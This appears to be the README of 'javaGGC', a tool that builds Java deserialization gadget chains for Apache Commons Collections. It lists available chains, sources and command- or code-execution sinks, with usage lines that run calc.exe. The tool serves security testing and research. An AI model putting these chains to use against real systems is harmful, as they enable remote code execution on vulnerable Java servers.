# javaGGC
***javaGGC for generate commons.collections gadget chain***

## Usage
### javaGGC 0
Use available ggc now!

CCHx is commons collections 4.x ggc relative to CCx.
```
Usage: javaGGC version=(3/4) [source=SOURCE_INDEX] [sink=SINK_INDEX] [arg=(command/code, 1 means default, startswith file:// means read code from file)] [test_on_local=(anyValue means yes)] 
       |
       javaGGC 0 [ggc=CC_INDEX/CC_NAME] [arg=(command/code, 1 means default, startswith file:// means read code from file)] [test_on_local=(anyValue means yes)]

Usage: javaGGC version=(3/4) [source=SOURCE_INDEX] [sink=SINK_INDEX] [arg=(command/code, 1 means default, startswith file:// means read code from file)] [test_on_local=(anyValue means yes)] 
       |
       javaGGC 0 [ggc=CC_INDEX/CC_NAME] [arg=(command/code, 1 means default, startswith file:// means read code from file)] [test_on_local=(anyValue means yes)]

Available GGC:
  [0] CC1 (command)
  [1] CC10 (command)
  [2] CC11 (code)
  [3] CC12 (code)
  [4] CC2 (code)
  [5] CC3 (code)
  [6] CC4 (code)
  [7] CC5 (command)
  [8] CC6 (command)
  [9] CC7 (command)
  [10] CC8 (code)
  [11] CCH1 (command)
  [12] CCH10 (command)
  [13] CCH11 (code)
  [14] CCH12 (code)
  [15] CCH3 (code)
  [16] CCH5 (command)
  [17] CCH6 (command)
  [18] CCH7 (command)
  [19] CCH8 (code)
  [20] CCK1 (code)
  [21] CCK2 (code)
  [22] CCK3 (command)
  [23] CCK4 (command)
```
usage: `javaGGC 0 CC1 calc.exe`
### javaGGC 3/4
Assemble these gadgets into a new ggc chain!
#### javaGGC 3
```
Usage: javaGGC version=(3/4) [source=SOURCE_INDEX] [sink=SINK_INDEX] [arg=(command/code, 1 means default, startswith file:// means read code from file)] [test_on_local=(anyValue means yes)] 
       |
       javaGGC 0 [ggc=CC_INDEX/CC_NAME] [arg=(command/code, 1 means default, startswith file:// means read code from file)] [test_on_local=(anyValue means yes)]

Available Source:
  [0] AnnotationInvocationHandlerSource (jdk<8u71)
  [1] BadAttributeValueExpExceptionSource
  [2] HashMapSource
  [3] HashSetSource
  [4] HashtableSource
Available Sink:
  [0] RuntimeExecSink (command)
  [1] ScriptEngineManagerSink (code)
  [2] TemplatesImplNewTransformerSink (code)
  [3] TemplatesImplTrAXFilterSink (code)
```
usage: `javaGGC 3 0 0 calc.exe`

#### javaGGC 4
```
Usage: javaGGC version=(3/4) [source=SOURCE_INDEX] [sink=SINK_INDEX] [arg=(command/code, 1 means default, startswith file:// means read code from file)] [test_on_local=(anyValue means yes)] 
       |
       javaGGC 0 [ggc=CC_INDEX/CC_NAME] [arg=(command/code, 1 means default, startswith file:// means read code from file)] [test_on_local=(anyValue means yes)]

Available Source:
  [0] AnnotationInvocationHandlerSource (jdk<8u71)
  [1] BadAttributeValueExpExceptionSource
  [2] HashMapSource
  [3] HashSetSource
  [4] HashtableSource
  [5] PriorityQueueSource
  [6] TreeBagSource
Available Sink:
  [0] RuntimeExecSink (command)
  [1] ScriptEngineManagerSink (code)
  [2] TemplatesImplNewTransformerSink (code)
  [3] TemplatesImplTrAXFilterSink (code)
```
usage: `javaGGC 4 0 0 calc.exe`

## Update
### V0.0.4
- add AnnotationInvocationHandlerSource for commons collections 4
- add CCH1, CCH3
### V0.0.3
- add TreeBagSource for commons collections 4

## Reference
[CCK Reference](https://github.com/shadowsock5/ysoserial/commit/cb0a3fa7aa8de4563fd4e1c57d45e6cd1ffea971)